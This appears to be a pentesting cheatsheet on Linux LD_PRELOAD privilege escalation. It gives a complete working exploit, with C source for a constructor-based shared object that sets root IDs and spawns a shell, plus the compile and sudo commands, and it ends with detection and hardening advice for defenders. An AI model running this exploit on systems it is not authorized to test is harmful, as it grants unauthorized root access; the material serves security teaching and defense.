## 👨‍🍳 Cheatsheet: Shared Object (`LD_PRELOAD`) Injection

Shared objects (`.so` files) in Linux are like DLLs in Windows—libraries of code that programs can load and use at runtime. `LD_PRELOAD` is a powerful environment variable that tells the dynamic linker to load a user-specified shared object **before** any other library. If a program with elevated privileges (like an SUID binary or a command run with `sudo`) is executed while this variable is set, it can be forced to load and run the attacker's malicious code first.

### ## What to Look For (Reconnaissance)

The primary way to exploit this is through `sudo`, so the first step is to check its configuration.

* **Check `sudo` privileges for `env_keep`:**
    The most common vector is when the `/etc/sudoers` file is configured to preserve the `LD_PRELOAD` variable for the user.
    ```bash
    sudo -l
    ```
    Look for the line `env_keep+=LD_PRELOAD` in the output. This is a critical misconfiguration.
    

* **Find SUID binaries:**
    On older or less secure systems, an SUID binary might not properly sanitize the environment variables it inherits. An attacker can look for SUID files and test if they respect `LD_PRELOAD`. This is less common on modern systems because the dynamic linker has built-in protections against this for SUID executables.

---

### ## Exploitation Workflow

The process involves creating a malicious shared object and forcing a privileged program to load it.

1.  **Write the Malicious C Code:**
    Create a C file (e.g., `shell.c`) that will be compiled into a shared object. The code will typically execute a command to spawn a shell. Using a `constructor` function ensures the code runs as soon as the library is loaded.
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    // This function is executed when the library is loaded
    __attribute__((constructor))
    void injected_function() {
        setuid(0); // Set user ID to root
        setgid(0); // Set group ID to root
        system("/bin/bash -p");
    }
    ```

2.  **Compile into a Shared Object:**
    Use `gcc` to compile the C file into a `.so` file.
    ```bash
    # -shared: Creates a shared library
    # -fPIC: Generates Position-Independent Code, required for shared libraries
    gcc -shared -fPIC -o /tmp/shell.so shell.c
    ```

3.  **Execute with `LD_PRELOAD`:**
    Run a command allowed by `sudo` while setting the `LD_PRELOAD` variable to point to your malicious library. It can be almost any command, as the code will execute before the program's `main` function is even called.
    ```bash
    sudo LD_PRELOAD=/tmp/shell.so /usr/sbin/apache2
    ```

4.  **Get Root:**
    If successful, you will immediately be dropped into a root shell.
    ```bash
    # whoami
    root
    ```

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **Process Auditing:** Monitor process execution and library loading. A privileged process loading a shared object from a non-standard, user-writable directory like `/tmp` or `/home/user` is a major red flag. Tools like `auditd` can be configured to watch for this.
* **Log Analysis:** Review `sudo` logs for commands being executed with suspicious environment variables.

#### **How to Prevent `LD_PRELOAD` Abuse**

* **Secure `/etc/sudoers` Configuration:** This is the most important defense. The default `sudo` configuration (`env_reset`) is secure and scrubs the `LD_PRELOAD` variable. **Never** add `LD_PRELOAD` to the `env_keep` directive. Audit your `sudoers` file to ensure this is not the case.
    ```
    # Good (Default):
    Defaults env_reset

    # Bad:
    Defaults env_keep += "LD_PRELOAD"
    ```

* **Use the `noexec` Mount Option:** Harden your system by mounting user-writable directories like `/tmp`, `/var/tmp`, and `/dev/shm` with the `noexec` flag. This prevents the execution of any binary from these locations, which can disrupt this attack.
    * **Example `/etc/fstab` entry:**
        ```
        tmpfs   /tmp   tmpfs   defaults,rw,nosuid,nodev,noexec,relatime   0  0
        ```

* **Principle of Least Privilege:** Only grant `sudo` rights for the specific commands a user needs. Avoid granting broad permissions that could be used as a vector for this attack.
